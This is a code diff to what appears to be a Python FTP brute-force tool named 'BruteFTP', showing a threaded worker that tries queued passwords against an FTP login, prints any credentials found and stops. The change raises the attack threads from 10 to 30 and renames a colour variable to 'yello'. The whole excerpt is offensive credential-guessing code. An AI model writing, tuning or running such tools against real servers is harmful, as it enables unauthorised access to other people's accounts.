@@ -38,7 +38,7 @@ def attack(host, port, user, q, stop, lock):
             print(f"[{cyan}BruteFTP{clear}] {host}{cyan}:{clear}{port} User {cyan}:{clear} {user} Login {cyan}:{clear} {password}")
         if connect(host, port, user, password):
             with lock:
-                print(f"[{yellow}FIND{clear}] {user}{yellow}:{clear}{password}")
+                print(f"[{yello}FIND{clear}] {user}{yello}:{clear}{password}")
             stop.set()
             break
         q.task_done()
@@ -53,7 +53,7 @@ def thread(host, port, user, passwords):
             q.put(password)
 
     threads = []
-    for _ in range(10):
+    for _ in range(30):
         t = threading.Thread(target=attack, args=(host, port, user, q, stop, lock))
         t.start()
         threads.append(t)
